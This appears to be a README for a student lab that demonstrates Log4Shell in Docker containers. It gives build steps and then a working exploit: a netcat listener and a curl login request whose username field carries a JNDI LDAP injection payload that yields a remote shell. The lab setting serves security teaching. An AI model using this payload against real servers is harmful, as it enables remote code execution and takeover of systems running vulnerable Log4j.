Step 1: Build the war file using mvn

cd log4shelldemo-group41
mvn clean install
mv target/language-based-sec-1.0-SNAPSHOT.war ../target

Step 2: Build the dockerfiles

cd ..
docker build -t log4j-shell .
docker build -t log4j-shell-utils . -f Dockerfile2

Step 3: Run docker images

docker run -p 8080:8080 -d log4j-shell
docker run --name log4shell-utils -d log4j-shell-utils

Step 4: Begin exploit

First terminal:
docker exec -it log4shell-utils bash // to login to container
nc -lnp 9999 // run nc command inside utils container 

Second terminal
curl --location --request POST 'http://localhost:8080/login'  --header 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'username=${jndi:ldap://172.17.0.3:1389/a}' --data-urlencode 'password=123'

Step 5: Check if exploit worked

Goto the terminal where nc is running and try running linux commands like ls, pwd etc.

Troubleshooting

Make the sure the ip in Exploit.java, start_ldap.sh and curl request has the utils docker container ip address.

Notes

The docker images are running in the default network, the ip address of the utild docker container could be identified using "docker inspect <container_name>" command.
